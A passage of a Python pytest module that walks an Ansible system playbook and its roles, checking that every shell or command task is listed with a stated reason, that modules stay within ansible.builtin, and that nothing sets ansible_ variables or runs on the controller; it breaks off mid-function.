"""Layer 1 is held to state modules: every task the system play reaches (playbooks/system.yml; docs/architecture/
engine.md §16.10) is a module of ansible.builtin that converges a state, or one of the commands below with its reason.

The walk is this file's own, and reads what Ansible reads: the play's pre_tasks, tasks, post_tasks and handlers, a
block's block, rescue and always among them; the task files they import or include by a literal name, in any spelling
(short, ansible.builtin., ansible.legacy.), from the including file's folder, or a role's tasks/; each role the play
names, a role includes or imports from anywhere, or a role's meta/main.yml names among its dependencies, found where
Ansible finds it (the roles' folder, roles_path), with its tasks, handlers, defaults, vars, meta and argument specs in
every spelling Ansible takes (main.yml, main.yaml, main.json, main, and a main/ folder of defaults or vars), the files
an include's tasks_from, handlers_from, vars_from and defaults_from name; the play's vars_files; each role's templates a
template task names; and each file of a role's files/ that a copy, unarchive, assemble or uri sends from this computer
(src, and uri's multipart filenames, unless remote_src is true, as it is for assemble unless said). A road it does not
follow is never passed over: it raises Unfollowed, which fails every test here by name - a playbook imported, an include
in a handler (Ansible resolves those otherwise), a file or a role named by a template, a role of a collection, a
collections keyword (under which a short name can stand for a collection's module), a role in the play's own roles/
folder (which Ansible searches before roles_path), a template outside a role or one that includes another; a task file
Ansible looks for elsewhere before the walk's - an import in a role's file that an include or import brought in (first
under that file's own folder's tasks/, then the working folder's tasks/), and an include or import two files below the
play (beside the play first); a file of this computer sent from outside a role, or one that is no file of its role's
files/; and what Ansible takes from the play's folder that the walk does not read - a folder of plugins but the three
BESIDE_THE_PLAY lists, a name of Ansible's own module, action or module_utils in those three (Ansible looks for its own
under ansible.legacy there first: a local normal.py runs for every module that has no action of its own), collections/,
and group_vars/ or host_vars/, whose variables reach the host whenever it joins a group - and any folder of plugins in
a role, each kind read from Ansible itself.

Four tests hold what it finds. A command, shell, raw, script or expect task that REASONS does not list fails by its file
and name, one REASONS lists that is no longer reached fails, and so does one whose module or arguments are not the ones
REASONS holds with its reason, so that a reason is held to what runs and the list tightens by itself; two such tasks of
one file and name fail as one key. A module outside ansible.builtin fails by name, but for the three OUTSIDE lists,
which F6a replaces with built-in ones, so that the product needs no Galaxy collection: then OUTSIDE is empty. Nothing
the play reaches sets a variable whose name begins ansible_, which would outrank the connection the engine wrote: a
play's vars, vars_files and vars_prompt, a role entry's params and vars, a role's defaults and vars, a block's or a
task's vars, a fact (a templated name refused), a register, a loop's variable, an include's apply, add_host, and any
include of variables (the play's own check sees every source of a host's variables but these, which it cannot). And
nothing the play reaches runs or writes on this computer: no delegate_to, local_action or connection keyword on a play,
a role entry, a block, a task or an include's apply, no fetch, no play over any host but all, no with_ loop, no
group_by or add_host (a group joined after the play's check of the connection), and no lookup but the five LOOKUPS
lists, read in every string of every file the walk read (a role's argument specs among them, which Ansible templates
here as its check's arguments) and in the templates.
"""

from __future__ import annotations

import dataclasses
import functools
import os
import re
from collections.abc import Iterable, Iterator
from pathlib import Path

import pytest
import yaml
from harness import REPO

PLAY = REPO / "playbooks" / "system.yml"


def _spelt(*names: str) -> frozenset[str]:
    """Each of names by every name Ansible takes for one of its own: short, ansible.builtin. and ansible.legacy."""
    return frozenset(f"{prefix}{name}" for prefix in ("", "ansible.builtin.", "ansible.legacy.") for name in names)


# What runs a command of the machine's rather than converge a state.
COMMANDS = _spelt("command", "shell", "raw", "script", "expect")
# Where a task sets a variable by name: a fact, an include of variables, a host added with variables of its own.
SET_FACT = _spelt("set_fact")
INCLUDE_VARS = _spelt("include_vars")
ADD_HOST = _spelt("add_host")
# The roads to more tasks: a task file, a role, a playbook; and the static one Ansible resolves otherwise when nested.
TASK_INCLUDES = _spelt("include_tasks", "import_tasks")
IMPORT_TASKS = _spelt("import_tasks")
ROLE_INCLUDES = _spelt("include_role", "import_role")
PLAYBOOK_IMPORTS = _spelt("import_playbook")
# A task that renders one of the role's templates, read for a lookup too.
TEMPLATES = _spelt("template")
# What writes on this computer whatever it is given: a file fetched from the machine.
FETCH = _spelt("fetch")
# What reads a file of this computer and sends it to the machine (their actions read src, and uri's multipart
# filenames, here unless remote_src): assemble's remote_src is true unless said, an unarchive's old copy key is read as
# a file of this computer's.
SENT = _spelt("copy", "unarchive", "assemble", "uri")
ASSEMBLE = _spelt("assemble")
UNARCHIVE = _spelt("unarchive")
URI = _spelt("uri")
# What joins a group after the play's check of the connection: Ansible then reads that group's variables beside the
# play and the inventory, which the check never saw.
GROUPS = _spelt("group_by", "add_host")
# The folders beside the play whose files Ansible reads as a host's variables.
HOST_VARIABLES = ("group_vars", "host_vars")
# The folders of plugins beside today's playbooks, which layer 1's play shares, and why each is no road: what is in
# them is reached by a name of its own alone, which outside() refuses, while a name of Ansible's own there is refused.
BESIDE_THE_PLAY = {
    "library": "today's playbooks' own modules, which the system play calls by no name",
    "action_plugins": "today's playbooks' own actions, which the system play calls by no name",
    "module_utils": "the code today's own modules share, which no module of Ansible's imports",
}
# The keywords that run a task, a block, a role or a play somewhere other than on the machine.
ELSEWHERE = ("delegate_to", "local_action", "connection")
# What makes a dict of a task list a block rather than a task, as Ansible's Block.is_block reads it.
BLOCK = ("block", "rescue", "always")
# An include of a role's: which of its folders each of its _from keys names a file of.
FROM = {"tasks_from": "tasks", "vars_from": "vars", "defaults_from": "defaults", "handlers_from": "handlers"}
# A role's name the walk follows: one of the roles' folder, never a collection's (a dot) or a path.
ROLE_NAME = re.compile(r"[A-Za-z0-9_][A-Za-z0-9_-]*")
# What opens a template, in a name Ansible would render before it found the file.
TEMPLATE = ("{{", "{%", "{#")
# A lookup, in any string: Ansible's lookup, query and q.
LOOKUP = re.compile(r"\b(?:lookup|query)\b|\bq\s*\(")
# A template that names another template, whose lookups the walk would not read: Jinja's {%- and {%+ too.
TEMPLATE_INCLUDE = re.compile(r"\{%[-+]?\s*(?:include|import|from|extends)\b")

# Every command the play reaches, by its file and name: why no state module serves it, then the module and its arguments
# exactly as Ansible's own parser reads them from the task, so that a reason is held to what runs. Those of today's
# roles stay as they stand until the cutover trims the roles (K28); the 1.x move is a no-op on a new machine until then.
REASONS: dict[tuple[str, str], tuple[str, str, dict]] = {
    ("playbooks/system.yml", "Read what the VM's base has"): (
        "raw, before anything needs Python: what the base lacks and what it can never run, read once",
        "ansible.builtin.raw",
        {
            "_raw_params": (
                'missing=""; for f in /usr/bin/python3 /usr/bin/sudo; do [ -x "$f" ] || missing="$missing $f"; '
                "done; for c in apt-get systemctl{{ ' cloud-init' if configure_wait_for_cloud_init | default(true) | "
                'bool else \'\' }}; do command -v "$c" > /dev/null 2>&1 || missing="$missing $c"; done; family=$(. '
                '/etc/os-release 2> /dev/null; echo " $ID $ID_LIKE "); case "$family" in *" debian "* | *" '
                'ubuntu "*) ;; *) missing="$missing an-Ubuntu-or-Debian-system"; esac; echo '
                '"base-missing:$missing"; arch=$(uname -m 2> /dev/null); bits=$(getconf LONG_BIT 2> /dev/null); '
                'case "$arch" in x86_64 | aarch64) ;; *) echo "base-refused:it is ${arch:-a machine uname does not '
                'name}, and Claude Code runs on x86_64 and aarch64 alone"; esac; [ "$bits" = 64 ] || echo '
                '"base-refused:its userland is ${bits:-not}-bit, and Claude Code runs on a 64-bit one alone"; if [ '
                '"$arch" = x86_64 ] && ! grep -qw avx /proc/cpuinfo 2> /dev/null; then echo "base-refused:its CPU '
                'has no AVX, which Claude Code needs: give the VM the CPU type host, or another that has it"; fi; '
                'for f in /lib/ld-musl-*; do if [ -e "$f" ]; then echo "base-refused:its C library is musl, which '
                "Docker's packages and Tailscale's do not run on\"; break; fi; done; if [ -e /run/ostree-booted ] || "
                "[ -e /etc/NIXOS ]; then echo \"base-refused:its packages are an image's (ostree or NixOS), not "
                'installed one by one as configure installs them"; fi; true'
            ),
        },
    ),
    ("playbooks/system.yml", "Wait for cloud-init to finish"): (
        "a read that waits: cloud-init status --wait",
        "ansible.builtin.command",
        {
            "cmd": "cloud-init status --wait",
        },
    ),
    ("playbooks/system.yml", "Read what cloud-init reported"): (
        "a read: cloud-init status --long, for the failure",
        "ansible.builtin.command",
        {
            "cmd": "cloud-init status --long",
        },
    ),
    ("roles/common/tasks/names.yml", "names | Move each file to its name from 2.0"): (
        "the 1.x moves, mv -n with creates and removes: a no-op on a new machine until K28 deletes it",
        "ansible.builtin.command",
        {
            "argv": ["mv", "-n", "{{ common_names_item.old }}", "{{ common_names_item.new }}"],
            "creates": "{{ common_names_item.new }}",
            "removes": "{{ common_names_item.old }}",
        },
    ),
    ("roles/common/tasks/sudo.yml", "sudo | Hash the user's password"): (
        "openssl passwd, the hash the user module is given: Python's crypt is gone from the controller",
        "ansible.builtin.command",
        {
            "argv": ["openssl", "passwd", -6, "-salt", "{{ common_user_password_salt }}", "-stdin"],
            "stdin": "{{ common_user_password }}",
        },
    ),
    ("roles/common/tasks/sudo.yml", "sudo | Read what sudo lets the user run now"): (
        "a read: sudo -l -U",
        "ansible.builtin.command",
        {
            "argv": ["/usr/bin/sudo", "-l", "-U", "{{ common_user }}"],
        },
    ),
    ("roles/common/tasks/sudo.yml", "sudo | Take the user out of the groups that reach root or the password"): (
        "gpasswd --delete, one group at a time: the user module sets a whole list of groups or appends",
        "ansible.builtin.command",
        {
            "argv": ["gpasswd", "--delete", "{{ common_user }}", "{{ common_user_group }}"],
        },
    ),
    ("roles/common/tasks/sudo.yml", "sudo | Read what sudo lets the user run in the end"): (
        "a read: sudo -l -U",
        "ansible.builtin.command",
        {
            "argv": ["/usr/bin/sudo", "-l", "-U", "{{ common_user }}"],
        },
    ),
    ("roles/common/tasks/ssh_path.yml", "ssh_path | Find where the connections come from, for {{ common_user }}"): (
        "a read: printenv SSH_CONNECTION, which no fact carries",
        "ansible.builtin.command",
        {
            "argv": ["printenv", "SSH_CONNECTION"],
        },
    ),
    ("roles/common/tasks/ssh_path.yml", "ssh_path | Read the PATH sshd gives the sessions of {{ common_user }}"): (
        "a read: sshd -T -C, what sshd applies, Match blocks included",
        "ansible.builtin.command",
        {
            "argv": [
                "/usr/sbin/sshd",
                "-T",
                "-C",
                "{{ common_ssh_connection.stdout | default('') | sshd_match_spec(common_user) }}",
            ],
        },
    ),
    ("roles/common/tasks/masked_units.yml", "masked_units | List which of the units to mask the VM has"): (
        "a read: systemctl list-unit-files, the units the machine has",
        "ansible.builtin.command",
        {
            "argv": "{{ ['systemctl', 'list-unit-files', '--no-legend', '--full', '--'] + common_masked_units }}",
        },
    ),
    ("roles/common/tasks/masked_units.yml", "masked_units | Read which of the units failed"): (
        "a read: systemctl is-failed",
        "ansible.builtin.command",
        {
            "argv": "{{ ['systemctl', 'is-failed', '--'] + common_masked_units_doomed }}",
        },
    ),
    ("roles/common/tasks/masked_units.yml", "masked_units | Clear the failed state a unit was left in"): (
        "systemctl reset-failed, which systemd_service has no state for, only where a unit failed",
        "ansible.builtin.command",
        {
            "argv": "{{ ['systemctl', 'reset-failed', '--'] + common_masked_units_failed }}",
        },
    ),
    ("roles/vscode_server/tasks/main.yml", "Look for the tools the server installer needs"): (
        "a read: command -v bash tar curl wget",
        "ansible.builtin.command",
        {
            "argv": ["bash", "-c", "command -v bash tar && { command -v curl || command -v wget; }"],
        },
    ),
    ("roles/vscode_server/tasks/main.yml", "Find where the editor's connection will come from"): (
        "a read: printenv SSH_CONNECTION, which no fact carries",
        "ansible.builtin.command",
        {
            "argv": ["printenv", "SSH_CONNECTION"],
        },
    ),
    ("roles/vscode_server/tasks/main.yml", "Read the configuration sshd applies to the editor's connection"): (
        "a read: sshd -T -C, what sshd applies, Match blocks included",
        "ansible.builtin.command",
        {
            "argv": [
                "/usr/sbin/sshd",
                "-T",
                "-C",
                "{{ vscode_server_ssh_connection.stdout | default('') | sshd_match_spec(vscode_server_user) }}",
            ],
        },
    ),
    ("roles/dev_tools/tasks/main.yml", "Take the user out of the docker group"): (
        "gpasswd --delete, one group at a time: the user module sets a whole list of groups or appends",
        "ansible.builtin.command",
        {
            "argv": ["gpasswd", "--delete", "{{ dev_tools_user }}", "docker"],
        },
    ),
    ("roles/dev_tools/tasks/uv.yml", "uv | Check installed version"): (
        "a read: uv --version",
        "ansible.builtin.command",
        {
            "argv": ["{{ dev_tools_uv_install_dir }}/uv", "--version"],
        },
    ),
    ("roles/dev_tools/tasks/rust.yml", "rust | Read the components installed for {{ dev_tools_rust_toolchain }}"): (
        "a read: rustup component list, from the toolchain's own manifest",
        "ansible.builtin.command",
        {
            "argv": ["rustup", "component", "list", "--installed", "--toolchain", "{{ dev_tools_rust_toolchain }}"],
        },
    ),
    ("roles/dev_tools/tasks/rust.yml", "rust | Install Rust {{ dev_tools_rust_toolchain }}"): (
        "rustup toolchain install, only where the toolchain is missing: rustup has no module",
        "ansible.builtin.command",
        {
            "argv": (
                "{{ ['rustup', 'toolchain', 'install', dev_tools_rust_toolchain, '--profile', 'minimal']\n   + "
                "dev_tools_rust_components | map('regex_replace', '^', '--component=') | list }}"
            ),
        },
    ),
    ("roles/dev_tools/tasks/rust.yml", "rust | Add the components the toolchain is missing"): (
        "rustup component add, only of those missing: rustup has no module",
        "ansible.builtin.command",
        {
            "argv": (
                "{{ ['rustup', 'component', 'add', '--toolchain', dev_tools_rust_toolchain] + dev_tools_rust_missing }}"
            ),
        },
    ),
}

# The modules outside ansible.builtin the play reaches, by file and name: three, each replaced by a built-in one in
# F6a, which takes them off this list.
OUTSIDE = {
    ("roles/common/tasks/main.yml", "Authorise SSH keys"): ("ansible.posix.authorized_key", "replaced by F6a"),
    ("roles/vscode_server/tasks/main.yml", "Raise the inotify watch limit for the editor's file watcher"): (
        "ansible.posix.sysctl",
        "replaced by F6a",
    ),
    ("roles/dev_tools/tasks/node.yml", "node | Install global npm packages"): (
        "community.general.npm",
        "replaced by F6a",
    ),
}

# Every string the play reaches that runs a lookup, on this computer, by its file and the whole string: what it reads.
LOOKUPS = {
    (
        "playbooks/system.yml",
        "{{ (lookup('ansible.builtin.file', ansible_inventory_sources | first) | from_json)['all']['hosts'] }}",
    ): "the inventory layer 1 wrote, read back by its own source, for the check of the connection",
    (
        "playbooks/tasks/remote_tmp.yml",
        "{{ lookup('ansible.builtin.config', 'remote_tmp', plugin_type='shell', plugin_name='sh') }}",
    ): "Ansible's own setting of root's temporary folder on the machine",
    ("roles/dev_tools/tasks/gh.yml", "{{ lookup('ansible.builtin.file', 'github-cli.asc') }}"): (
        "the GitHub CLI's signing key, a file of the role's own"
    ),
    ("roles/dev_tools/tasks/node.yml", "{{ lookup('ansible.builtin.file', 'nodesource.asc') }}"): (
        "NodeSource's signing key, a file of the role's own"
    ),
    ("roles/dev_tools/tasks/docker.yml", "{{ lookup('ansible.builtin.file', 'docker.asc') }}"): (
        "Docker's signing key, a file of the role's own"
    ),
}


class Unfollowed(ValueError):
    """A road to a task, a variable or this computer that the walk does not follow: every test here fails on it."""


class Repeated(ValueError):
    """Two tasks of one file and one name, where a task is held by its file and name: one could stand for the other."""


@dataclasses.dataclass
class Walk:
    """What the play reaches, each with the file that holds it: the plays; every task, handler and block; every role
    entry of a play's roles: or a meta/main.yml's dependencies; every file of variables (vars_files, the roles' defaults
    and vars); every file read; and the templates a template task renders."""

    plays: list[tuple[Path, dict]] = dataclasses.field(default_factory=list)
    entries: list[tuple[Path, dict]] = dataclasses.field(default_factory=list)
    roles: list[tuple[Path, object]] = dataclasses.field(default_factory=list)
    variables: list[Path] = dataclasses.field(default_factory=list)
    files: list[Path] = dataclasses.field(default_factory=list)
    templates: list[Path] = dataclasses.field(default_factory=list)


def _where(path: Path, repo: Path) -> str:
    return str(path.relative_to(repo))


def _parsed(task: dict) -> tuple[str, dict, object]:
    """The module or action a task calls as written, its arguments, and where it is delegated (Ansible's Sentinel where
    it is not), as Ansible's own parser finds them among the task's keys: action:, local_action:, k=v forms included."""
    from ansible.parsing.mod_args import ModuleArgsParser

    return ModuleArgsParser(task_ds=task).parse(skip_action_validation=True)


def _role_files(root: Path, folder: str, main: str | None, allow_dir: bool) -> list[Path]:
    """The files of a role's folder Ansible loads (Role._load_role_yaml): main.yml, main.yaml, main.json, then main,
    the first there; for a file named by an include's _from, that name first as it stands; and for defaults and vars, a
    main/ folder's files. Unfollowed where a file named by a _from is not there."""
    from ansible.parsing.dataloader import DataLoader

    where = root / folder
    if not where.is_dir():
        if main is not None:
            raise Unfollowed(f"{where}: {folder}/{main}, which an include names, is not there")
        return []
    extensions = [".yml", ".yaml", ".json"]
    if main is None:
        name, extensions = "main", [*extensions, ""]
    else:
        name, extensions = main, ["", *extensions]
    found = [Path(each) for each in DataLoader().find_vars_files(str(where), name, extensions, allow_dir)]
    if main is not None and not found:
        raise Unfollowed(f"{where}: {folder}/{main}, which an include names, is not there")
    return found


def _literal(value: object, said: str) -> str:
    """A file's name as written, which the walk can follow: a relative path with no template in it and no way up."""
    if not isinstance(value, str) or not value or any(opener in value for opener in TEMPLATE):
        raise Unfollowed(f"{said}, {value!r}: a name the walk cannot follow, only a literal one")
    if os.path.isabs(value) or ".." in Path(value).parts:
        raise Unfollowed(f"{said}, {value!r}: the walk follows a relative name with no way up, as the roles name files")
    return value


@functools.cache
def plugin_folders() -> frozenset[str]:
    """Every folder Ansible loads plugins from beside a play and in each role it loads (add_all_plugin_dirs, and a
    role's own load): each of its plugin loaders' folder, read from Ansible itself."""
    from ansible.plugins.loader import get_all_plugin_loaders

    return frozenset(loader.subdir for _, loader in get_all_plugin_loaders() if loader.subdir)


@functools.cache
def ansibles_own() -> frozenset[str]:
    """The names of Ansible's own modules, actions and module_utils, which it looks for under ansible.legacy in the
    play's folders before its own (a leading _, Ansible's mark of an alias, taken off): read from the installed
    package's folders, never a package's __path__, which a test that imports today's module_utils extends."""
    import importlib.util
    import pkgutil

    spec = importlib.util.find_spec("ansible")
    assert spec is not None and spec.origin is not None
    home = Path(spec.origin).parent
    folders = [str(home / "modules"), str(home / "plugins" / "action"), str(home / "module_utils")]
    return frozenset(each.name.lstrip("_") for each in pkgutil.iter_modules(folders))


def _beside_the_play(basedir: Path, repo: Path) -> None:
    """Unfollowed on what Ansible takes from the play's own folder that the walk does not read: group_vars/ and
    host_vars/, a folder of plugins but the three BESIDE_THE_PLAY lists, collections/ (searched whatever the
    configuration names), and a name of Ansible's own in the three."""
    for entry in sorted(basedir.iterdir()):
        said = _where(entry, repo)
        if entry.name in HOST_VARIABLES:
            raise Unfollowed(f"{said}: variables of the play's host, reaching it as it joins a group after the check")
        if entry.name == "collections" or (entry.name in plugin_folders() and entry.name not in BESIDE_THE_PLAY):
            raise Unfollowed(f"{said}: a folder Ansible loads code from beside the play, run on this computer")
        if entry.name in BESIDE_THE_PLAY and entry.is_dir():
            for each in sorted(entry.iterdir()):
                if Path(each.name).stem.lstrip("_") in ansibles_own():
                    raise Unfollowed(f"{_where(each, repo)}: a name of Ansible's own, which it takes from here first")


def _sent_from_here(action: str, args: dict, said: str) -> list[object]:
    """The names of the files of this computer a task's action reads and sends to the machine: copy's, unarchive's,
    assemble's and uri's src, and uri's multipart filenames, but where remote_src is true as written (assemble's
    default); a multipart body the walk cannot read raises Unfollowed."""
    if action not in SENT:
        return []
    if action in UNARCHIVE and "copy" in args:
        remote = False  # the old way to say where src is, read as this computer
    elif "remote_src" in args:
        remote = args["remote_src"] is True
    else:
        remote = action in ASSEMBLE
    if remote:
        return []
    names = [args["src"]] if "src" in args else []
    if action in URI:
        form = args.get("body_format")
        if form == "form-multipart" or (form is not None and (not isinstance(form, str) or _templated(form))):
            body = args.get("body")
            if body is not None and not isinstance(body, dict):
                raise Unfollowed(f"{said}: a multipart body the walk cannot read, whose files are read here")
            for value in (body or {}).values():
                if isinstance(value, dict) and "filename" in value:
                    names.append(value["filename"])
                elif _templated(value):
                    raise Unfollowed(f"{said}: a multipart field the walk cannot read, whose file is read here")
    return names


def _role_file(name: object, role: Path | None, said: str) -> None:
    """Unfollowed unless name is a file of role's files/, the first place Ansible looks for it from a role's task."""
    source = _literal(name, f"{said}: a file of this computer sent to the machine")
    if role is None:
        raise Unfollowed(f"{said}: {source}, a file of this computer sent from outside a role, with no files/")
    if Path(source).parts[0] == "files":
        raise Unfollowed(f"{said}: {source}, a name under files/, which Ansible looks for under the role's own first")
    files = role / "files"
    path = files / source
    if not path.is_file() or not path.resolve().is_relative_to(files.resolve()):
        raise Unfollowed(f"{said}: {source}, which is no file of its role's files/")


def walk(play: Path = PLAY, repo: Path = REPO) -> Walk:
    """Everything play reaches, read as the module's docstring says; Unfollowed on a road it does not follow."""
    found = Walk()
    basedir = play.parent
    files: set[tuple[Path, bool, int]] = set()
    roles: set[tuple[str, tuple]] = set()

    def read(path: Path) -> object:
        if not path.is_file():
            raise Unfollowed(f"{path}, which the play reaches, is not a file")
        if path not in found.files:
            found.files.append(path)
        return yaml.safe_load(path.read_text())

    def task_file(path: Path, role: Path | None, handlers: bool, depth: int) -> None:
        # How deep a file is reached decides how Ansible finds what it includes: a role's entry is 0, the play's own
        # tasks 0 and the file it imports 1. A file reached again deeper is walked again, its includes held as there
        # (past 2 nothing changes, so a file that includes itself ends), and its tasks are found once.
        key = (path, handlers, min(depth, 2))
        if key not in files:
            first = not any((path, handlers, each) in files for each in range(3))
            files.add(key)
            task_list(read(path), path, role, handlers, depth, first)

    def task_list(items: object, path: Path, role: Path | None, handlers: bool, depth: int, first: bool) -> None:
        if items is None:
            return
        if not isinstance(items, list) or not all(isinstance(item, dict) for item in items):
            raise Unfollowed(f"{_where(path, repo)}: a list of tasks that is not one")
        for task in items:
            said = f"{_where(path, repo)}: {task.get('name', '')}"
            if first:
                found.entries.append((path, task))
            if "collections" in task:
                raise Unfollowed(f"{said}: a collections keyword, under which a short name can be a collection's")
            if any(key in task for key in BLOCK):
                for key in BLOCK:
                    task_list(task.get(key), path, role, handlers, depth, first)
                continue
            action, args, _ = _parsed(task)
            if action in PLAYBOOK_IMPORTS:
                raise Unfollowed(f"{said}: a playbook imported, which the walk does not follow")
            if handlers and action in TASK_INCLUDES | ROLE_INCLUDES:
                raise Unfollowed(f"{said}: an include in a handler, which Ansible resolves otherwise")
            if action in TASK_INCLUDES:
                if role is not None and depth >= 1 and action in IMPORT_TASKS:
                    raise Unfollowed(
                        f"{said}: an import in a file an include brought in, which Ansible looks for under that file's"
                        " own folder's tasks/ and the working folder's before the role's tasks/"
                    )
                if role is None and depth >= 2:
                    raise Unfollowed(
                        f"{said}: an include two files below the play, which Ansible looks for beside the play first"
                    )
                name = _literal(args.get("_raw_params", args.get("file")), f"{said}: {action}")
                where = Path(os.path.normpath((role / "tasks" if role else path.parent) / name))
                task_file(where, role, False, depth + 1)
            elif action in ROLE_INCLUDES:
                froms = {FROM[key]: _literal(args[key], f"{said}: {key}") for key in FROM if key in args}
                role_walk(args.get("name", args.get("role")), froms, said)
            elif action in TEMPLATES:
                source = _literal(args.get("src"), f"{said}: a template's src")
                if role is None:
                    raise Unfollowed(f"{said}: a template outside a role, where the walk reads a role's templates/")
                if Path(source).parts[0] == "templates":
                    raise Unfollowed(f"{said}: {source}, a name under templates/, looked for under the role's first")
                template = role / "templates" / source
                if not template.is_file() or not template.resolve().is_relative_to((role / "templates").resolve()):
                    raise Unfollowed(f"{said}: the template {source}, not in its role's templates/")
                if TEMPLATE_INCLUDE.search(template.read_text()):
                    raise Unfollowed(f"{_where(template, repo)}: a template that names another, unread by the walk")
                if template not in found.templates:
                    found.templates.append(template)
            for name in _sent_from_here(action, args, said):
                _role_file(name, role, said)

    def role_entry(entry: object, path: Path, said: str) -> None:
        found.roles.append((path, entry))
        if isinstance(entry, dict) and "collections" in entry:
            raise Unfollowed(f"{said}: a role entry's collections keyword")
        role_walk(entry.get("role", entry.get("name")) if isinstance(entry, dict) else entry, {}, said)

    def role_walk(name: object, froms: dict[str, str], said: str) -> None:
        if not isinstance(name, str) or not ROLE_NAME.fullmatch(name):
            raise Unfollowed(f"{said}: the role {name!r}, which is no role of the roles' folder the walk can follow")
        if (name, tuple(sorted(froms.items()))) in roles:
            return
        roles.add((name, tuple(sorted(froms.items()))))
        if (basedir / "roles" / name).exists():
            raise Unfollowed(f"{said}: the role {name}, which the play's own roles/ folder holds, ahead of roles_path")
        root = repo / "roles" / name
        if not root.is_dir():
            raise Unfollowed(f"{said}: the role {name}, which the roles' folder does not hold")
        for folder in sorted(plugin_folders()):
            if os.path.lexists(root / folder):
                raise Unfollowed(f"{_where(root / folder, repo)}: a role's folder Ansible loads code from, run here")
        for path in _role_files(root, "meta", None, allow_dir=False):
            meta = read(path) or {}
            if not isinstance(meta, dict) or "collections" in meta:
                raise Unfollowed(f"{_where(path, repo)}: a role's meta that is no mapping, or a collections keyword")
            for dependency in meta.get("dependencies") or []:
                role_entry(dependency, path, f"{_where(path, repo)}: a dependency")
        # The argument specs, whose strings Ansible templates here as its check's arguments: read for the lookups.
        if any((root / "meta" / f"argument_specs{extension}").exists() for extension in (".yml", ".yaml", ".json")):
            for path in _role_files(root, "meta", "argument_specs", allow_dir=False):
                read(path)
        for folder in ("defaults", "vars"):
            for path in _role_files(root, folder, froms.get(folder), allow_dir=True):
                read(path)
                found.variables.append(path)
        for path in _role_files(root, "tasks", froms.get("tasks"), allow_dir=False):
            task_file(path, root, False, 0)
        for path in _role_files(root, "handlers", froms.get("handlers"), allow_dir=False):
            task_file(path, root, True, 0)

    _beside_the_play(basedir, repo)
    plays = read(play) or []
    if not isinstance(plays, list) or not all(isinstance(each, dict) for each in plays):
        raise Unfollowed(f"{_where(play, repo)}: a playbook that is no list of plays")
    for each in plays:
        said = _where(play, repo)
        if set(each) & PLAYBOOK_IMPORTS:
            raise Unfollowed(f"{said}: a playbook imported, which the walk does not follow")
        if "collections" in each:
            raise Unfollowed(f"{said}: a play's collections keyword, under which a short name can be a collection's")
        found.plays.append((play, each))
        for key in ("pre_tasks", "tasks", "post_tasks"):
            task_list(each.get(key), play, None, False, 0, True)
        task_list(each.get("handlers"), play, None, True, 0, True)
        for name in each.get("vars_files") or []:
            path = basedir / _literal(name, f"{said}: vars_files")
            read(path)
            found.variables.append(path)
        for entry in each.get("roles") or []:
            role_entry(entry, play, f"{said}: roles")
    return found


def _tasks(found: Walk, repo: Path) -> Iterator[tuple[tuple[str, str], str, dict, object]]:
    """Each task the play reaches but a block: its file and name, the module it calls, its arguments and delegation."""
    for path, task in found.entries:
        if not any(key in task for key in BLOCK):
            action, args, delegated = _parsed(task)
            yield (_where(path, repo), task.get("name", "")), action, args, delegated


def _keyed(pairs: Iterable[tuple[tuple[str, str], object]], what: str) -> dict[tuple[str, str], object]:
    """pairs as a dict, Repeated where two share a key: a list held by file and name holds one task under each."""
    keyed: dict[tuple[str, str], object] = {}
    for key, value in pairs:
        if key in keyed:
            raise Repeated(f"two {what} of one file and name, {key}: name them apart, as each is held by its name")
        keyed[key] = value
    return keyed


def commands(play: Path = PLAY, repo: Path = REPO) -> dict[tuple[str, str], tuple[str, dict]]:
    """Each task the play reaches that runs a command, by its file and name: the module it calls and its arguments."""
    found = walk(play, repo)
    pairs = ((key, (action, args)) for key, action, args, _ in _tasks(found, repo) if action in COMMANDS)
    return _keyed(pairs, "commands")


def outside(play: Path = PLAY, repo: Path = REPO) -> dict[tuple[str, str], str]:
    """Each task the play reaches whose module is no module of ansible.builtin, by its file and name: the module."""
    found = walk(play, repo)
    pairs = ((key, action) for key, action, _, _ in _tasks(found, repo) if not action.startswith("ansible.builtin."))
    return _keyed(pairs, "tasks outside ansible.builtin")


def unreasoned(found: dict, reasons: dict) -> list[str]:
    """What found, commands() of a play, does that reasons does not hold: a command with no reason, a reason for a
    command no longer reached, and a command whose module or arguments are not those its reason is held to."""
    said = [f"{key}: a command, shell or raw task REASONS gives no reason" for key in sorted(set(found) - set(reasons))]
    said += [f"{key}: in REASONS, and no longer reached: take it out" for key in sorted(set(reasons) - set(found))]
    said += [
        f"{key}: runs {found[key]!r}, where its reason is held to {tuple(reasons[key][1:])!r}: change both together"
        for key in sorted(set(found) & set(reasons))
        if tuple(found[key]) != tuple(reasons[key][1:])
    ]
    return said


def _templated(name: object) -> bool:
    return isinstance(name, str) and any(opener in name for opener in TEMPLATE)


def _mapping(path: Path, repo: Path) -> dict:
    data = yaml.safe_load(path.read_text()) or {}
    if not isinstance(data, dict):
        raise Unfollowed(f"{_where(path, repo)}: a file of variables that is no mapping")
    return data


def setting_connection_variables(play: Path = PLAY, repo: Path = REPO) -> list[str]:
    """Each place what the play reaches sets a variable whose name begins ansible_, said as the file, where in it, and
    the name; and every include of variables and templated fact's name, whose names the scan cannot read."""
    found = walk(play, repo)
    named: list[tuple[str, object]] = []
    always: list[str] = []
    for path, each in found.plays:
        where = _where(path, repo)
        named += [(f"{where}: the play's vars", name) for name in each.get("vars") or {}]
        prompts = each.get("vars_prompt") or []
        named += [(f"{where}: the play's vars_prompt", p.get("name") if isinstance(p, dict) else p) for p in prompts]
    for path, entry in found.roles:
        if isinstance(entry, dict):
            where = _where(path, repo)
            named += [(f"{where}: a role's params", name) for name in entry if name != "vars"]
            named += [(f"{where}: a role's vars", name) for name in entry.get("vars") or {}]
    for path in found.variables:
        named += [(_where(path, repo), name) for name in _mapping(path, repo)]
    for path, task in found.entries:
        where = f"{_where(path, repo)}: {task.get('name', '')}"
        named += [(where, name) for name in task.get("vars") or {}]
        loop_control = task.get("loop_control") or {}
        named += [(f"{where}: loop_control", loop_control.get(key)) for key in ("loop_var", "index_var")]
        if any(key in task for key in BLOCK):
            continue
        action, args, _ = _parsed(task)
        if action in SET_FACT:
            named += [(where, name) for name in args]
            always += [f"{where}: a fact of a templated name, {name!r}" for name in args if _templated(name)]
        if isinstance(task.get("register"), str):
            named.append((where, task["register"]))
        if action in INCLUDE_VARS:
            always.append(f"{where}: an include of variables, {args!r}")
        if action in ADD_HOST:
            named += [(f"{where}: add_host", name) for name in args]
        if action in TASK_INCLUDES | ROLE_INCLUDES and isinstance(args.get("apply"), dict):
